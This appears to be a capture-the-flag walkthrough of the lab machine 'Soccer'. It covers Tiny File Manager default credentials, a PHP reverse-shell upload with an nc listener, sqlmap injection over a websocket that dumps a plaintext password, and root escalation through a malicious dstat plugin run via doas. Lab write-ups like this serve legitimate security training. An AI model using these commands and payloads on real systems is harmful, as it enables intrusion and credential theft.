
## 2026-11-17
---

System: Linux
Difficulty: Easy

IP Address: 10.129.105.63

NMAP Ports are enumerated.
```
kali@kali:~$ sudo nmap 10.129.105.63 -sC -sV
```

Here are the results.
```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
```

This line is added to `/etc/hosts` file.
```
10.129.105.63	soccer.htb
```

Directories are now enumerated.
```
gobuster dir -u http://soccer.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

A new endpoint has been found: `http://soccer.htb/tiny`
A login page is visible on the endpoint, from tiny file manager.

`admin:admin@123` default credentials worked successfully.
While `user:12345` also worked, that account does not have the upload privileges.
The version of the application is 2.4.3.
![[soccer_1.png]]

Since the automated GitHub exploit is not working, the shell is uploaded manually on the website.
The file `php-reverse-shell.php` is modified with the corresponding attacker IP Address and Port then uploaded through the `uploads` server directory.

![[soccer_2.png]]

The attacker machine is now listening for a reverse shell.
```
kali@kali:~$ sudo nc -lvnp 4444
```

After clicking the page, the shell is successfully returned.
```
Connection received on 10.129.105.63 60374
Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 21:30:15 up  2:34,  0 users,  load average: 0.01, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

An interesting web directory has been found on the server: `/etc/nginx/sites-available/soc-player.htb`

Here are the contents of the file.
```
server {
	listen 80;
	listen [::]:80;

	server_name soc-player.soccer.htb;

	root /root/app/views;

	location / {
		proxy_pass http://localhost:3000;
		proxy_http_version 1.1;
		proxy_set_header Upgrade $http_upgrade;
		proxy_set_header Connection 'upgrade';
		proxy_set_header Host $host;
		proxy_cache_bypass $http_upgrade;
	}
}
```

This line is added to `/etc/hosts` file.
```
10.129.105.63	soccer.htb soc-player.soccer.htb
```

Here is the contents of the website.
Since no credentials are found, account creation is attempted.

![[soccer_3.png]]

After logging in, it is possible to see a `/check` endpoint on the server.
![[soccer_4.png]]

After inspecting the ticket request on BurpSuite, it is possible to see that this was a websocket interaction on the previously found port 9091.

Since chances of SQL Injection are high, `sqlmap` is used to exploit.
```
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id":"1234"}' --dbs --threads 10 -- level 5 --risk 3 --batch
```

Successfully found databases. The `soccer_db` one looks interesting.
```
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys
```

The database is queried.
```
kali@kali:~$ sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id":"1234"}'　--threads 10 -D soccer_db --dump --batch
```

As a result, new credentials are obtained successfully.
```
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
```

Login is now attempted from SSH.
```
kali@kali:~$ ssh player@soccer.htb
```

User Flag contents as below.
```
5b5e6435ff7447175caa239e7e06fa7c
```

The binaries with Setuid enabled are shown.
```
find / -perm -4000 -type f 2>/dev/null
```

An interesting binary is shown to have sudo execution privileges.
```
/usr/local/bin/doas
```

In the file `/usr/local/etc/doas.conf`, it is possible to find more information.
```
permit nopass player as root cmd /usr/bin/dstat
```

So just executing the binary `doas /usr/bin/dstat` allows privileged execution. 

This website shown how to exploit the binary successfully.
Link: https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-dstat-privilege-escalation

Create a file `/usr/local/share/dstat/dstat_exploit.py`
```
import os
os.system("/bin/bash")
```

The exploit file has been successfully identified.
```
player@soccer:/usr/local/share/dstat$ doas /usr/bin/dstat --list | grep exploit
	exploit
```

Now the command is run alongside the exploit, resulting in a root shell.
```
player@soccer:/usr/local/share/dstat$ doas /usr/bin/dstat --exploit
```

The root flag contents are in below.
```
05ce95388b3632296c47460147cf0996
```